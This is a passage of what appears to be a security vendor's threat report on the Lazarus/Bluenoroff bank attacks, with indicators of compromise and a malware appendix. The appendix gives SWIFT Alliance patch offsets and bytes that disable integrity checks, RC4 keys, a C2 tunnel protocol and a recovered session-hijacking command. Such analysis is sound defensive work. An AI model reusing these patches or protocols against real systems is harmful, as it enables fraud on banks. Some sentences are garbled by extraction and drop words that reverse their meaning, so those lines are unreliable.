identify an additional C2 server belonging to the same attackers: Destination:Port Type Bytes Transfered 73.245.147[.]162:443 SSL Less than 1.5MB While this additional C2 hasn\\'t been reported previously, there were no additional hosts found that connected to that server. Lateral Movement. Host1. During the attack, the threat actor deployed a number of other malware to a second machine we call Host1. The malware files include: Filename Size MD5 %SYSTEM% \\\\ msv2_0.dll 78\\'848 bytes 474f08fb4a0b8c9e1b88349098de10b1 %WINDIR% \\\\ Help \\\\ msv2_0.chm 729\\'088 bytes 579e45a09dc2370c71515bd0870b2078 %WINDIR% \\\\ Help \\\\ msv2_0.hlp 3\\'696 bytes 7413f08e12f7a4b48342a4b530c8b785 The msv2_0.dll decrypts and loads the payload from msv2_0.chm , which , in turn , decrypts and loads a configuration file from msv2_0.hlp . msv2_0.hlp , which is encrypted with Spritz encryption algorithm and the following key: 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98 Full technical details about this malware are available in the Appendix. The decrypted configuration file contains references to two previously known 1 Blue n oroff C2 servers: tradeboard.mefound[.]com:443 mov is - es.ignorelist[.]com:443 Another file created around the same time was found in : C: \\\\ Windows \\\\ Temp \\\\ tmp3363.tmp . It included a short text file which contain ed the following text message: [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Additional search es by events which occurred around the same time brought some evidence of other command line executable modules and Windows system tools being run on that day and later. The following Prefetch files indicate the execution of other modules: Executable Run Counter RUNDLL32.EXE 1 RUNDLL32.EXE 2 1 FIND.EXE 6 GPSVC.EXE 11 SC.EXE 11 NET.EXE 42 NETSTAT.EXE 8 MSDTC.EXE 7 This confirms the active reconnaissance stage of the attack. According to prefetch files for RUNDLL32.EXE, this executable was used to load msv2_0.dll and msv2_0.chm . References to these files were found in the prefetch data of this process. 1 Blue n oroff is a Kaspersky Lab codename for a threat actor involved in financial targeted attacks. The m ost well - known attack launched by the Blue n oroff group is the Bangladesh bank heist. 2 Same executable was run with different command line Note: MSDTC.EXE and GPSVC.EXE are among the commonly used filenames of these attackers in the past. While these filenames may look legitimate, their location was different from the standard system equivalents. Standard Windows msdtc.exe binary is usually located in %systemroot% \\\\ System32 \\\\ msdtc.exe , while the attacker placed msdtc.exe in %systemroot% \\\\ msdtc.exe for disguise. The path was confirmed from parsed prefetch files. Unfortunately the attackers have already securely wiped the msdtc.exe file in the Windows directory. We were unable to recover th is file. The same applies to %systemroot% \\\\ gpvc.exe which existed on the dates of the attack but was securely wiped by the attackers later. Based on the timestamps we found so far, it seems that the initial infection of Host1 occurred through access from a privileged account. We looked carefully at the events preceding the infection time and found something suspicious in the Windows Security event log: Description Special privileges assigned to new logon. Subject: Security ID: [REDACTED] Account Name: [ADMIN ACCOUNT REDACTED] Account Domain: [REDACTED] Logon ID: [REDACTED] Privileges: SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege [ADMIN ACCOUNT REDACTED]\\' had log ged into the same system in the past. According to the event logs this had never happened before the attackers used it. Apparently, this user logon had very high privileges ( SeBackupPrivilege, SeLoadDriverPrivilege, SeDebugPrivilege, SeImpersonatePrivilege ) , allowing the remote user to fully control the host, install system services, drivers, start processes as other users, and have full control over other processes running in the system (i.e. inject code into their memory). Next, we searched for other e vent log records related to the activity of the same account , and found several records suggesting that this account was used from Host1 to access other hosts in the same domain. Description A logon was attempted using explicit credentials. ... Account Whose Credentials Were Used: Account Name: [ADMIN ACCOUNT REDACTED] Account Domain: [REDACTED] Logon GUID: {00000000 - 0000 - 0000 - 0000 - 000000000000} Target Server: Target Server Name: [REDACTED] Additional Information: [REDACTED] Process Information: Process ID: 0x00000000000xxxxx Process Name: C: \\\\ Windows \\\\ System32 \\\\ schtasks.exe Network Information: Network Address: - Port: - This event is generated when a process attempts to log on an account by This most commonl y occurs in batch - type configurations such as scheduled tasks, or when using the RUNAS command . This indicates that the account was used to create new scheduled tasks on the remote hosts. This is one of the popular ways to remotely run new process es and propagate infection s during cyber attacks. Then we searched for other similar attempts to start schtasks.exe remotely on other hosts and collected several of them. Lateral Movement. Host2. This host contained several unique and very large malware modules. The following files were found on the system: Filename Size MD5 C: \\\\ Windows \\\\ gpsvc.exe 3\\'449\\'344 bytes 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae C: \\\\ Windows \\\\ Help \\\\ srservice.chm 1\\'861\\'632 bytes cb65d885f4799dbdf80af2214ecdc5fa (decrypted file MD5: ad5485fac7fed74d112799600edb2fbf) C: \\\\ Windows \\\\ Help \\\\ srservice.hlp 3696 bytes 954f50301207c52e7616cc490b8b4d3c (config file, see description of ad5485fac7fed74d112799600edb2fbf) C: \\\\ Windows \\\\ System32 \\\\ srservice.dll 1\\'515\\'008 bytes 16a278d0ec24458c8e47672529835117 C: \\\\ Windows \\\\ System32 \\\\ lcsvsvc.dll 1\\'545\\'216 bytes c635e0aa816ba5fe6500ca9ecf34bd06 All of this malware were general purpose backdoors and their respective dropper s , loaders and configuration files. Details about this malware is available in the Appendix. Lateral Movement. Host3. The following malicious files were found on the system: Filename Size MD5 C: \\\\ Windows \\\\ gpsvc.dat 901\\'555 bytes c1364bbf63b3617b25b58209e4529d8c C: \\\\ Windows \\\\ gpsvc.exe 753\\'664 bytes 85d316590edfb4212049c4490db08c4b C: \\\\ Windows \\\\ msdtc.bat 454 bytes 3b1dfeb298d0fb27c31944907d900c1d Gpsvc.dat contains an encrypted payload for an unidentified loader. It\\'s possible that the loader was placed on a different host following the anti - forensic technique that we have observed previously or gpsvc.exe is the loader but we are missing the secret passphrase passed via commandline . The decrypted files are described in the Appendix t o this report. Cease o f Activity In several cases we investigated, once the attackers were confident they had been discovered , because they lost some of the compromised assets, they started wiping the remaining malware payloads. This indicates a skilled at tacker, who cares about being discovered. Other Known Operations The attack on European financial institutions was implemented via a watering hole, a compromised government website that had many regular visitors from local banks. However, the same approach has been used in multiple other places around the world. The Polish waterhole incident got much more public attention than the others due to the escalation of the alert to a higher level and the compromise of a government website. We have seen a few other websites being compromised with the same symptoms and turned into a watering hole through script injection or by placing exploit delivery code. We have found them in the following countries: Russian Federation Australia Uruguay Mexico India Nigeria Peru What connected most of the compromised websites was the JBoss application server platform. This suggests that attackers may have an exploit for the JBoss server. Unfortunately we manage d to find the exp loit code yet. Nevertheless , we would like to recommend to all JBoss application server administrators that they limit unnecessary access to their servers and check the access logs for attack attempts. Banks were not the only Lazarus G roup targets. This s uggests that it has multiple objectives. We have seen some unusual victims, probably overlapping with the wider Lazarus G roup operations, i.e. a cryptocurrency business . When it comes to Bluenoroff , its typical list of targets includes banks, financial and trading companies , casinos and cryptocurrency businesses . Detections of Lazarus/Bluenoroff malware are also distributed across the world. Here are some: Conclusions Lazarus is not just another APT actor. The scale of Lazarus operations is shocking. It has been on a growth spike since 2011 and activities didn\\'t disappear after Novetta published the results of its Operation Blockbuster research. All those hundreds of samples that were coll ected give the impression that Lazarus is operating a factory of malware , which produces new samples via multiple independent conveyors. We have seen it using various code obfuscation techniques, rewriting its own algorithms, applying commercial software protectors, and using its own and underground packers. Lazarus knows the value of quality code, which is why we normally see rudimentary backdoors being pushed during the first stage of infection. Burning those doesn\\'t cause too much impact on the group. However, if the first stage backdoor reports an interesting infection it starts deploying more advanced code, carefully protecting it from accidental detection on disk. The code is wrapped into a DLL loader or stored in an encrypted container , or maybe hid den in a binary encrypted registry value. It usually comes with an installer that only the attackers can use, because they password protect it. It guarantees that automated systems - be it public sandbox or a researcher\\'s environment - will never see the r eal payload. Most of the tools are designed to be disposable material that will be replaced with a new generation as soon as they are burnt. And then there will be new er, and new er, and new er versions . Lazarus avoids reusing the same tools, the same code, and the same algorithms. \"Keep morphing!\" seems to be its internal motto. Those rare cases when it is caught with the same tools are operational mistakes, because the group seems to be so large that one part doesn\\'t know what the other is doing . All this level of sophistication is something that is not generally found in the cybercriminal world. It\\'s something that requires strict organization and control at all stages of the operation. That\\'s why we think that Lazarus is not just another APT actor. Of course such a process requires a lot of money to keep running the business , which is why the appearance of the Bluenoroff subgroup within Lazarus was logical. Bluenoroff , as a subgroup of Lazarus , is focused only on financial attacks. It has re verse engineering skills and spends time tearing apart legitimate software, implementing patches for SWIFT Alliance software, and finding ways and schemes to steal big money. Its malware is different and the attackers aren\\'t exactly soldiers that hit and r un. Instead they prefer to make an execution trace to be able to reconstruct and quickly debug the problem. They are field engineers that come when the ground is already cleared after the conquest of new lands. One of Bluenoroff\\'s favorite strategies is to silently integrate into running processes without breaking them . From the perspective of the code we\\'ve seen it looks as if it is not exactly looking for hit and run solution s when it comes to money theft. Its solutions are aimed at invisible theft without leaving a trace. Of course , attempts to move around millions of USD can hardly remain unnoticed but we believe that its malware might now be secretly deployed in many other places - and it doesn\\'t trigger any serious alarms because it\\'s much more quiet. We would like to note, that in all the observed attacks against banks that we have analyzed , servers used to connect to SWIFT didn\\'t demonstrate or expose any specific vulnerability . The attacks were focused on the banks infrastructure and staff, exploiting vulnerabilities in commonly used software or websites, bruteforcing passwords, using keyloggers and elevating privileges. However, the design of inter - banking transactions using a bank\\'s own server running SWIFT connected software suggests that there are personnel responsible for the administration and operation of the SWIFT connected server. S ooner or later the attackers find these users, gain their necessary privileges and access the server connected to the SWIFT messaging platform. With administrative access to the platform , they can manipulate the software running on the system as they wish . T here is not much that can stop them, because from a technical perspective it may not differ from what authorized and qualified engineers do: starti ng and stopping services, patching software, or modifying database s . Therefore , in the breaches we analyzed , SWIFT as an organization directly at fault . More than that, we have witnessed SWIFT trying to protect its customers by implementing t he detection of database and software integrity issues. We believe that this is the right direction and has to be extended with full support. Complicating patches of integrity checks further may create a serious threat to the success of further operations run by Lazarus/Bluenoroff against banks worldwide. To date, the Lazarus/Bluenoroff group has been one of the most successful in large scale operations against financial industry. We believe that it will remain one of the biggest threats to the banking sec tor, finance and trading companies as well as casinos , for years to come . As usual, defense against attacks such as those from Lazarus/Bluenoroff should include a multi - layered approach. Kaspersky Lab products include special mitigation strategies against this group, as well as many other APT groups we track. If you are interested in read ing more about effective mitigation strategies in general, we recommend the following articles: Strategies for mitigating APTs H ow to mitigate 85% of threats with four strategies We will continue tracking the Lazarus/Bluenoroff actor and will share new findings with our intel report subscribers as well as with the general public.

Appendix: Malware Analysis Malware 1: SWIFT transactions Information Harvester (New Runoff) MD5: 0abdaebbdbd5e6507e6db15f628d6fd7 Discovered path: C: \\\\ MSO10 \\\\ fltmsg.exe Date: 2016.08.18 23:44:21 Size: 90\\'112 bytes Compiled o n: 2016.08.18 22:24:41 (GMT) Linker version: 10.0 Type: PE32 executable (GUI) Intel 80386, for MS Windows Internal Bluenoroff module tag: NR Used in: Incident #1 An a lmost identical file was found in another location with the following properties: MD5: 9d1db33d89ce9d44354dcba9ebba4c2d Discovered path: D: \\\\ Alliance \\\\ Entry \\\\ common \\\\ bin \\\\ win32 \\\\ nroff.exe Date detected: 2016 - 08 - 12 22:24:19 Size: 89\\'088 bytes Compiled o n: 201 6.08.12 12:25:02 (GMT) Type: PE32 executable (GUI) Intel 80386, for MS Windows Internal module mark: NR The compilation timestamp indicates the malware was compiled exactly one day before being used in the bank. The module starts from creating a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C: \\\\ MSO10 . Also, it crafts several local filepaths , the purpose of which isn\\'t clear . N ot all have reference in the code and they could be copy - pasted code or part of a common file i n the framework. The paths are represented with the following strings: %DRIVE%: \\\\ MSO10 \\\\ LATIN.SHP %DRIVE%: \\\\ MSO10 \\\\ ENGDIC.LNG %DRIVE%: \\\\ MSO10 \\\\ ADDT.REF %DRIVE%: \\\\ MSO10 \\\\ MSE.LIV Upon start ing it makes five attempts to read file C: \\\\ MSO10 \\\\ LATIN.SHP with an interval o f 100ms. If the LATIN.SHP container is not found or has an invalid signature, the log record will contain the following message: \" NR - PR\" , which we assume indicates a PR oblem loading module codenamed \" NR \". The name \"NR\" is probably a reference to the printer helper program called \"nroff\" used by SWIFT Alliance software. The origins of the nroff name go back to a Unix text - formatting program according to Wikipedia . The file is read successfully if its size is larger than or equal to a hardcoded value of 35,260 bytes. After that the module decrypts the file with an RC4 algorithm using a hardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF. This ha rdcoded key is quite unique and has been discovered in few other places, including in other tools from the set of malware used to attack SWIFT Alliance software and within the Wiper Tool discovered in Bangladesh in early 2016 (MD5: 5d0ffbc8389f27b0649696f0 ef5b3cfe). It was also used in another tool to encrypt configuration files as reported by BAE Systems. The decrypted data from the file is validated by checking the magic heade r of the data, which should be 0xA0B0C0D0 value. The file contains a configuration of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks of 1096 bytes each. The number of blocks may vary, the module reads them all and stores th em in a linked list structure. There is an internal logging feature implemented in the current module, which keeps a text log in C: \\\\ MSO10 \\\\ ENGDIC.LNG. The text records are stored in lines of the following format: [%Hour%:%Minute%:%Second%] [%Process_PID%] %Message% \\\\ r \\\\ n The message may contain the following prefixes: [ERROR] [INFO] [WARNING] This executable is designed to be called with three parameters: fltmsg.exe <mode> <print file> <output - path> The first parameter is a number 1 or 2. If any other value is passed to the executable it simply saves it to the log in the format of \" NR - PR - P %mode%\" . We assume that \"NR - PR - P\" is interpreted by the attackers as \"nroff problem parameter\". Mode 1 means that the module shall select the output path automatically, w hich contains the following string template: \" #%04d%04d.prt \", otherwise the output path is copied from the third command line argument. For recognized modes 1 and 2 the module saves a backup for every \"print file\" passed to it via command line that has th e extension \".prt\", \".out\" or \".txt\". The backups are stored in one of the following directories: C: \\\\ MSO10 \\\\ P %N% \\\\ MOT \\\\ C: \\\\ MSO10 \\\\ R %N% \\\\ MOT \\\\ C: \\\\ MSO10 \\\\ N %N% \\\\ MOT \\\\ Where %N% is a sequential integer number. The malware is an information harvester. It processes files passed to it, parses them and searches for specific SWIFT transaction codes, such as: 28C: Statement Number 25: Account Identification Its main purpose is to accumulate information about transactions passed through it, saving Sender and Receiver, Account and Statement Numbers as well as some other data included in parsed files. The files passed to it are allegedly in the SWIFT transaction format, which suggests that the attackers were closely accustomed to internal SWIFT documentation or carefully reverse engineered the format. It recognizes the following format tags: 515 (M51) 940 (M94) - start of day balance 950 (M95) - end of day balanc e When such files are found , it logs them into the log folder drive: \\\\ MSO10 and saves a copy. The RC4 - encrypted file we found (LATIN.SHP) contained the following strings after decryption: D: \\\\ Alliance \\\\ Entry \\\\ database \\\\ bin \\\\ sqlplus.exe D: \\\\ Alliance \\\\ Entry \\\\ common \\\\ bin \\\\ win32 D: \\\\ Alliance \\\\ Entry C: \\\\ MSO10 \\\\ fltmsg.exe C: \\\\ MSO10 \\\\ MSO.DLL C: \\\\ MSO10 \\\\ MXS.DLL \\\\ \\\\ 127.0.0.1 \\\\ share localhost \\\\ testuser \\\\ \\\\ 127.0.0.1 \\\\ share \\\\ In the older case from Bangladesh the config contained SWIFT business identifier codes (BIC) to hide in SWIFT transaction statements. Malware 2: SWIFT Alliance Access Protection Mangler MD5: 198760a270a19091582a5bd841fbaec0 Size: 71\\'680 bytes Discovered path: C: \\\\ MSO10 \\\\ MSO.dll Compiled o n: 2016.08.18 22:24:44 (GMT) Linker version: 10.0 Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Internal Bluenoroff module tag: PM Used in: Incident #1 The compilation timestamp indicates the malware was compiled in the days preceding the attack on the bank. This malware tool is used to patch some SWIFT Alliance so ftware modules in the memory to disable certain protection mechanisms that were implemented to detect direct database manipulation attempts. The code was most likely created by the same developer that created SWIFT transactions Information Harvester (MD5: 0abdaebbdbd5e6507e6db15f628d6fd7). Like the information harvester it creates a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C: \\\\ MSO10 . It also crafts several local filepaths , the purpose of which isn\\'t clear . N ot all h ave reference in the code and could be a copy - pasted code or part of common file in the framework: %DRIVE%: \\\\ MSO10 \\\\ LATIN.SHP %DRIVE%: \\\\ MSO10 \\\\ ENGDIC.LNG %DRIVE%: \\\\ MSO10 \\\\ ADDT.REF %DRIVE%: \\\\ MSO10 \\\\ MSE.LIV Upon start ing it makes five attempts to read file C: \\\\ MSO10 \\\\ LATIN.SHP with an interval of 100ms. If the LATIN.SHP container is not found or i s invalid, the log will contain the following message: \" PM - PR\" . The file is read successfully if its size is larger or equal to a hardcoded value of 35,260 . After tha t the module decrypts the file with an RC4 algorithm using a hardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF. The decrypted data from the file is validated by checking the magic header of the data, which should be 0xA0B0C0D0 valu e. The file contains a configuration block of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks of 1096 bytes long. The number of blocks may vary, the module reads them all and stores them in a linked list structure. If the LATIN.SHP file is found then the module simply counts the number of record s in it and proceeds with patching the target file, which is described fu r ther. If it is not found or the file magic bytes differ from expected after decryption, then the patching do es not happen and the code simply drops execution. There is an internal logging feature implemented in the current module, which keeps text log in C: \\\\ MSO10 \\\\ ENGDIC.LNG. The following log messages may appear in this file in plaintext: Log message format De scription of values PatchMemory(%s, %d) %s - current executable filename %d - 0 or 1 (0 - unpatch operation, 1 - patch operation) [PatchMemory] %s %s - current executable filename [PatchMemory] LoadLibraryA(%s) = %X %s - additional DLL filename %X - additional DLL image base address [WorkMemory] %s %d End %s - executable name to be patched %d - process ID value This is printed in case of failure to open process [WorkMemory] pid=%d, name=%s %d - process ID value %s - executable name to be patched [P atch] 1 Already Patched %s %s - executable name to be patched [Unpatch] 1 Already Unpatched %s %s - executable name to be patched [Patch] 1 %s %s - executable name to be patched [Patch] 1 %s %s - executable name to be patched P[%u - %d] %d %u - process ID which is patched %d - patch index (starts from 0), corresponds to patch block %d - contains last WinAPI error code This is printed in case of failure to patch memory P[%u - %d] OK %u - process ID which is patched %d - patch index (starts from 0), corresp onds to patch block [Patch] 2 Already Patched %s %s - executable name to be patched [Unpatch] 2 Already Unpatched %s %s - executable name to be patched [Patch] 2 %s %s - executable name to be patched [Patch] 2 %s %s - executable name to be patched The module has seven embedded blocks of 0x130 bytes long that contain patch target information. Each block seems to have four slots of 0x4C bytes with patch information . H owever , only the first slot per module is used at this point . Each slot contains information for just two code modifications. The patch slots include the size of the patch, and the relative path to the module to be patched on disk, offset to the patched bytes (contain ing the relative virtual address) and original bytes. The patcher verifies that the original bytes are in place before modifying the code. The patch procedure can also do unpatching by design, however this feature is currently unused. The first slot is a patch for the liboradb.dll library which seems to be essential and is applied in all cases. Other patches are designed for specific executable s that the current SWIFT Alliance Software Patcher DLL module is loaded in. It searches for a corresponding patch that matches the current process executable fil ename and applies only that patch . The following table contains an interpretation of the patch - blocks embedded into the binary. The t able omits empty slots and shows only valid patch instructions: Block Module Patch RVA Original code Replacement Description 1 liboradb.dll 0x8147e 04 00 Disable s checksum verification 2 Block is Unused 3 MXS_cont.exe 0xff49 e8c2fbffff b801000000 Disables internal security checks. 0x10b0c e8c2fbffff b801000000 4 mxs_ha.exe 0x65a9 e8c2fbffff b801000000 Disables internal security checks. 0x716c e8c2fbffff b801000000 5 sis_sndmsg.exe 0x49719 e8c2fbffff b801000000 Disables internal security checks. 0x4a2dc e8c2fbffff b801000000 6 SNIS_sendmsg.exe 0xa8119 e8c2fbffff b801000000 Disables internal security checks. 0xa8cdc e8c2fbffff b801000000 7 SNSS_cont.exe 0x7849 e8c2fbffff b801000000 Disables internal security checks. 0x840c e8c2fbffff b801000000 SWIFT Alliance software binary tools are linked with file \"saa_check.cpp\" , which provides basic security checks and validates the integrity of the database. The patches are applied to the modules to disable these checks and prevent the detection of database inconsistency. The file selection is not random, as far as the SWIFT con nected servers server environment is a complex of executable files with complicated relations, the attackers identified all executables that implemented new security features and patched them off. We have checked all other binaries on the analyzed servers and none of other applications were linked with saa_check.cpp, except those in the patchlist. The patcher DLL has to be loaded into the address space of the target process to work. It is not designed to patch other processes. Malware 3: SWIFT Alliance sof tware Files Hook MD5: f5e0f57684e9da7ef96dd459b554fded Size: 91\\'136 bytes Discovered path: C: \\\\ MSO10 \\\\ MXS.dll Compiled o n: 2016.08.18 22:24:31 (GMT) Linker version: 10.0 Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Internal Bluenoroff module tag: HD (alternative: HF) Used in: Incident #1 The compilation timestamp indicates the malware was compiled during the days of the attack on the bank. It is very similar to SWIFT transactions Information Harvester and SWIFT Alliance software Protection Mangler. Like the i nformation h arvester it creates a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C: \\\\ MSO10 . Similarly , it crafts several local filepaths: %DRIVE%: \\\\ MSO10 \\\\ LATIN.SHP %DRIVE%: \\\\ MSO10 \\\\ ENGDIC.LNG %DRIVE%: \\\\ MSO10 \\\\ ADDT.REF %DRIVE%: \\\\ MSO10 \\\\ MSE.LIV Upon start ing it makes five attempts to read file C: \\\\ MSO10 \\\\ LATIN.SHP with an interval of 100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following message: \" HD - PR\" . The file is read successfully if its size is larger than or equal to a hardcoded value of 35,260 . After that the module decrypts the file with an RC4 algorithm using the hardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF. The decrypted d ata from the file is validated by checking the magic header of the data, which should be 0xA0B0C0D0 value. The file contains a configuration of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks 1096 bytes long. The number of b locks may vary, the module reads them all and stores them in a linked list structure. If the LATIN.SHP file is found then the module simply counts the number of records in it and proceeds. If it is not found or the magic file bytes differ from expected af ter decryption, then the patching will not happen and the code simply drops execution. There is an internal logging feature implemented in the current module, which keeps a text log in C: \\\\ MSO10 \\\\ ENGDIC.LNG. The following log messages may appear in a file in plaintext: Log message format Description of values HF_Initialize(%s) %s - current executable filename NewCopyFileA(%s, %s, %d) The arguments correspond to source, destination file and flag value for \"overwrite if exists\". NewCopyFileA - > CreateProcess(%s) failed with error=%d %s - commandline of a fltmsg.exe process %d - Win32 API integer error code NewCreateProcessA(%s) - 1 %s command line of a new process NewCreateProcessA(%s) - 2 %s command line replacement The purpose of this module is in patching the current process, so that CopyFileA function in fact calls a custom hook function, which calls CreateProcessA and passes some arguments to it. The command line for the new process is as follow s : C: \\\\ MSO10 \\\\ fltmsg.exe 2 \"%source_path%\" \"%destination_path%\" The path to the fltmsg.exe process is taken from the decrypted configuration file C: \\\\ MSO10 \\\\ LATIN.SHP . Another API function , CreateProcessA is similarly hooked. Any call to create a new process , w hich starts one of two recognized executables \"nroff\" or \"printhelper\" , is modified. Before the original executables are called , a custom application will be spawned with the following commandline: C: \\\\ MSO10 \\\\ fltmsg.exe 0 %original arguments% - for nroff C: \\\\ MSO10 \\\\ fltmsg.exe 1 %original arguments% - for printhelper If the execution fails the module logs a failure message with a Win32 API error code. We assume that this module is injected in the middle of running SWIFT Alliance software, to divert some of the interesting files for alteration or to mak e a reserve copy. Malware 4: Session Hijacker MD5: 2963cd266e54bd136a966bf491507bbf Date (appeared in collection): 2015 - 05 - 23 02:27 Size: 61\\'440 bytes Discovered path: c: \\\\ windows \\\\ mdtsc.exe Compiled o n: 2011.02.18 07:49:41 (GMT) Type: PE32+ executable (console) x86 - 64, for MS Windows Linker version: 10.0 Used in: Incident #1 This file is a command line tool to start a new process as another user currently logged on to the same system. To find the user token , one of the following case - insensitive command line options is used: Option Description - n <Name> Find token by process name - p <PID> Find token by process ID - s <SESSID> Find token by Terminal session ID The last command line option defines the command line of the new process to start. Example usage: c: \\\\ windows \\\\ mdtsc.exe - p 8876 \"rundll32.exe c: \\\\ windows \\\\ fveupdate.dll,Start MAS_search.exe\" The example tool usage was recovered from an infected system during forensic analysis. It was used to start a SWIFT A lliance software tool via a custom application starter that most probably tampered with the new process. The fveupdate.dll module was not recovered from the system. Malware 5: TCP Tunnel Tool MD5: e62a52073fd7bfd251efca9906580839 Date discovered: 2016.08.1 2 01:11:31 Discovered path: C: \\\\ Windows \\\\ winhlp.exe Size: 20\\'480 bytes Known as: winhlp.exe, msdtc.exe Last s tart d ate: 2016.08.12 21:59 Started by: svchost.exe (standard Windows signed binary) Compiled o n: 2014.09.17 16:59:33 (GMT) Type: PE32 executable (GU I) Intel 80386, for MS Windows Linker version: 6.0 Used in: Incident #1 This application is a tool that works as a simple TCP relay that encrypts communication with C2 and contains remote reconfiguration capability. It has to be started with at least two parameters containing host IP and port. Two additional optional parameters may define the destination server IP and port to relay network connections to. The destination server IP and port can be retrieved and reconfigured live from C2. Let\\'s refer to the se pairs of IP/ports as HostA/PortA and HostB/PortB respectively. When the tool starts it attempts to connect to the C2 server, which starts from the generation of a handshake key. The handshake key is generated via a simple algorithm such as the following: i = 0; do { key[i] = 0xDB * i ^ 0xF7; ++i; } while ( i < 16 ); This algorithm generates the following string: ASCII Hexadecimal , - ./()*+$%& \\\\ \\' !\" 2c 2d 2e 2f 28 29 2a 2b 24 25 26 27 20 21 22 Next , it generates a message body, a string of bytes from 64 to 192 bytes long. The fifth DWORD in the message is replaced with special code 0x00000065 (\"e\" character). Then it encrypts the message with a handshake key and sends it to the C2 server with the dat a block length prepended to that buffer. This is what such a packet looks like (blue rows are encrypted with RC4 and handshake key): Offset (bytes) Size (bytes) Description 0 4 Size of the rest of data in the message 4 16 Random data 20 4 Special code 0x00000065 (\"e\") 24 >=64 Random data It expects similar behaviour from the server. The server responds with similar packet, where the first DWORD is the size of the rest of the packet and the only meaningful value is at offset 0x14, which must contain 0x00000066 (\"f\") or the handshake is not successful. If the handshake is successful, the tool spawns a dedicated thread to deal with the C2 connection. It uses RC4 encryption to communicate with the C2 over TCP with a hardcoded 4 - bytes key value: E2 A4 8 5 92 . The analyzed sample uses binary protocol for communication, exchanging messages in fixed length blocks of 40 bytes, which are encrypted with RC4 as mentioned above. Each such block contains a DWORD at offset 0x4 describing a control code used in the protocol. Other fields in the block may contain additional information or be set to a randomly generated number for distraction. Client Server Control Code Meaning Control Code Meaning 0x10001 Ready to work 0x10000 Keep - Alive 0x10008 Task Done 0x10002 Start tunnelling with HostB 0x10003 Set new HostB/PortB 0x10004 Get current HostB/PortB 0x10006 Terminate i mmediately For the Control Code 0x10003, additional information including IP and port number s are transferred in the same message block at offsets 0x10 for IP and 0x14 for port. The tool will not start connecting to HostB until it receives a 0x10002 command to start the tunnelling proce ss. When this happens it will open an additional , independent TCP session with HostA, will do a handshake , and then pass all data back and forth without modification. Other variants of the tool were found in different places: 02f75c2b47b1733f1889d6bbc026157c - uploaded to a multiscanner from Bangladesh. 459593079763f4ae74986070f47452cf - discovered in Costa Rica. ce6e55abfe1e7767531eaf1036a5db3d - discovered in Ethiopia . All these tools use the same hardcoded RC4 key value of E2 A4 85 92 . Malware 6: Active Backdoors MD5: 2ef2703cfc9f6858ad9527588198b1b6 Type: PE32 executable (GUI) Intel 80386, for MS Windows Size: 487\\'424 bytes Name: mso.exe Link t ime: 2016.06.14 11:56:42 (GMT) Linker version: 6.0 Used in: Incident #1, Inciden t #2 This module is linked with opensource SSL/TLS suite mbedTLS (aka PolarSSL) as well as zLib 1.2.7 and libCURL libraries.

The final command line string to start the back door (as per registry autorun key) is : C: \\\\ Users \\\\ %user% \\\\ AppData \\\\ Roaming \\\\ IMEKLMG.exe - s Depending on the available command line arguments the module may use a C2 address from the following locations: 1. C2 configuration stored in the registry (expected 1840 bytes). The configuration is located at HKLM \\\\ SYSTEM \\\\ CurrentControlSet \\\\ Control \\\\ Network \\\\ EthernetDriver. The data inside the key is encrypted with a DES algorithm with a hardcoded encryption key: 58 29 AB 7C 86 C2 A5 F9 . 2. Hardcoded C2 address and port. 3. [Unfini shed backdoor code] Use a C2 address and port passed via command line. Note, this code is currently unfinished: it contains a command line argument parsing and setting in the memory of the backdoor: up to six pairs of C2 host s and port s can be passed to it , but this information seems not to be reaching the main backdoor code yet. If the registry value with config is not set upon the backdoor start, it creates this value , populating the config with hardcoded values. When the module is passed to a domain an d port pair via the command line, config from the registry or hardcoded value, it resolves the IP address of the domain (if the domain is passed) and produces a different IP by decrypting the DNS request with a 4 - byte XOR operation. The XOR constant is har dcoded: 0xF4F29E1B.

The same file , but compressed with an unknown packer , was discovered uploaded on VT from Poland and Korea in November 2016. This suggests backdoor reuse in those countries. It has the following properties: Name: IMEKLMG.exe.dmp MD5: 06cd99f0f9f152655469156059a8ea25 SHA1: 77c7a17ccd4775b2173a24cd358ad3f2676c 3452 File s ize: 376832 bytes File t ype: PE32 executable (GUI) Intel 80386, for MS Windows Link t ime: 2016.06.14 11:56:42 (GMT) Linker version: 6.0 Another similar file was discovered in February 2017 , distributed from a Nigerian webserver.

H owever , it contains some differences and improvements. It uses an external file to store configuration, located at %SYSTEMROOT% \\\\ sys tray.dat. The config has a fixed size of 182 bytes and has the following structure: XORed with 0xDE Random 4 bytes Magic Value: 0x12458FAE Other data Similar to other backdoors , it uses XOR operation on the DNS response. The XOR DWORD constant is different here: 0xCBF9A345 . The sample contains the following default hardcoded C2 address: tradeboard.mefound[.]com:443 To complicate analysis , the developer has implemented a protoc ol with dynamically chang ing constants depending on the variant of the malware. So far, the backdoor \"speaks the same language\" but with a different \"dialect\". This is implemented through a different base for all messages. This sample supports similar comm ands but its Command IDs are shuffled and start with a different number. Command ID Description 0x23FAE29C Get system information: hostname, OS version, locale, list of network interface cards with properties. 0x23FAE2A4 Sleep command. Disconnect from C2. Save current time and show no network activity for specified time. 0x23FAE2A6 Hibernate command. Disconnect from C2 and show no network activity.

